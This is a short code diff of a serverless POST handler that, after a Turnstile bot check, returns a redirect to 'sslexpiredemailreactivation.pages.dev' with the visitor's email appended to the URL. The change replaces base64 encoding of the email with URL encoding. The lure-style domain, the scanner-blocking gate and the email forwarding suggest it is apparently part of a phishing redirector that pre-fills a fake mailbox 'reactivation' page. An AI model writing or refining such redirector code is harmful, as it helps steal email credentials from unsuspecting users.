@@ -19,8 +19,7 @@ export async function onRequestPost(context) {
     return new Response("Turnstile verification failed", { status: 403 });
   }
 
-  const base64Email = btoa(email);
-const redirectUrl = `https://sslexpiredemailreactivation.pages.dev?email=${base64Email}`;
+  const redirectUrl = `https://sslexpiredemailreactivation.pages.dev?email=${encodeURIComponent(email)}`;
   return new Response(JSON.stringify({ redirectUrl }), {
     headers: { "Content-Type": "application/json" },
     status: 200,
